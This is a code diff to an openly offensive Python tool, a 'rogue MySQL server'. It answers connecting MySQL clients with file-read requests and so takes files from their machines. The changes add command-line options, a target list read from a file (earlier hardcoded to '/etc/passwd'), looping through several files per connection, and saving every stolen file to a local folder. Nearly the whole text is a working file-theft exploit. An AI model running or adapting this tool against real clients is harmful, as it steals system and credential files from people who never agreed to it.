@@ -9,30 +9,39 @@ import struct
 import random
 import logging
 import logging.handlers
+import argparse
+import os
 
 
 
-PORT = 3306
+PORT = 3305
+LOG_FILE = 'mysql.log'
+VERBOSE = False
+SAVE_FOLDER = os.sep.join(os.path.abspath(__file__).split(os.sep)[:-1]) + os.sep + 'Download' + os.sep
 
 log = logging.getLogger(__name__)
 
 log.setLevel(logging.INFO)
-tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
+tmp_format = logging.handlers.WatchedFileHandler(LOG_FILE, 'ab')
 tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
 log.addHandler(
     tmp_format
 )
 
-filelist = (
-    '/etc/passwd',
-)
+filelist = [
+    #'C:\\Windows\\win.ini',
+]
 
 
 #================================================
 #=======No need to change after this lines=======
 #================================================
 
-__author__ = 'Gifts'
+__author__ = 'Alexey'
+parser = argparse.ArgumentParser(description='Rogue MySQL server')
+parser.add_argument("-p", "--port", type=int)
+parser.add_argument("-f", "--files", help="Path to file with list of files for download.")
+parser.add_argument("-v", "--verbose", action='store_true', help='Print files content in console.')
 
 def daemonize():
     import os, warnings
@@ -62,8 +71,8 @@ class OutOfOrder(Exception):
 
 
 class mysql_packet(object):
-    packet_header = struct.Struct('<Hbb')
-    packet_header_long = struct.Struct('<Hbbb')
+    packet_header = struct.Struct('<HbB')
+    packet_header_long = struct.Struct('<HbbB')
     def __init__(self, packet_type, payload):
         if isinstance(packet_type, mysql_packet):
             self.packet_num = packet_type.packet_num + 1
@@ -74,9 +83,9 @@ class mysql_packet(object):
     def __str__(self):
         payload_len = len(self.payload)
         if payload_len < 65536:
-            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
+            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num % 255)
         else:
-            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)
+            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num % 255)
 
         result = "{0}{1}".format(
             header,
@@ -101,6 +110,8 @@ class http_request_handler(asynchat.async_chat):
         asynchat.async_chat.__init__(self, sock=addr[0])
         self.addr = addr[1]
         self.ibuffer = []
+        self.file_number = 0
+        self.current_filename = ''
         self.set_terminator(3)
         self.state = 'LEN'
         self.sub_state = 'Auth'
@@ -122,10 +133,12 @@ class http_request_handler(asynchat.async_chat):
         log.debug('Pushed: %r', data)
         data = str(data)
         asynchat.async_chat.push(self, data)
+        #print("Pushed DATA: %s %s" % (data, data.encode('hex')))
 
     def collect_incoming_data(self, data):
-        log.debug('Data recved: %r', data)
+        log.debug('Data received: %r', data)
         self.ibuffer.append(data)
+        #print("Received DATA: %s %s" % (data, data.encode('hex')))
 
     def found_terminator(self):
         data = "".join(self.ibuffer)
@@ -156,10 +169,11 @@ class http_request_handler(asynchat.async_chat):
                     if packet.payload[0] == '\x03':
                         log.info('Query')
 
-                        filename = random.choice(filelist)
+                        self.current_filename = filelist[self.file_number]
+                        self.file_number += 1
                         PACKET = mysql_packet(
                             packet,
-                            '\xFB{0}'.format(filename)
+                            '\xFB{0}'.format(self.current_filename)
                         )
                         self.set_terminator(3)
                         self.state = 'LEN'
@@ -186,13 +200,28 @@ class http_request_handler(asynchat.async_chat):
                     if self.sub_state == 'File':
                         log.info('-- result')
                         log.info('Result: %r', data)
-
                         if len(data) == 1:
-                            self.push(
-                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
-                            )
-                            raise LastPacket()
+                            if packet.packet_num < 256 and self.file_number < len(filelist) - 1:
+                                self.current_filename = filelist[self.file_number]
+                                self.file_number = (self.file_number + 1) % len(filelist)
+                                self.set_terminator(3)
+                                self.state = 'LEN'
+                                self.sub_state = 'File'
+                                self.push(
+                                    mysql_packet(packet, '\xFB{0}'.format(self.current_filename))
+                                )
+                            else:
+                                if VERBOSE:
+                                    print('***Need new query or all found files were downloaded***')
+                                self.push(
+                                    mysql_packet(packet, '\0\0\0\x02\0\0\0')
+                                )
+                                raise LastPacket()
                         else:
+                            with open(SAVE_FOLDER + os.path.normpath(self.current_filename).split(os.sep)[-1], 'wb') as fl:
+                                fl.write(data)
+                            if VERBOSE:
+                                print('***File %s obtained.***\n%s' % (self.current_filename, data[1:]))
                             self.set_terminator(3)
                             self.state = 'LEN'
                             self.order = packet.packet_num + 1
@@ -242,7 +271,17 @@ class mysql_listener(asyncore.dispatcher):
             log.info('Conn from: %r', pair[1])
             tmp = http_request_handler(pair)
 
+if __name__ == '__main__':
+    args = parser.parse_args()
+    if args.files:
+        filelist += open(args.files, 'r').read().split('\n')
+    if args.port:
+        PORT = args.port
+    if args.verbose:
+        VERBOSE = args.verbose
+    if not os.path.exists(SAVE_FOLDER):
+        os.mkdir(SAVE_FOLDER)
 
-z = mysql_listener()
-# daemonize()
-asyncore.loop()
+    z = mysql_listener()
+    #daemonize()
+    asyncore.loop()
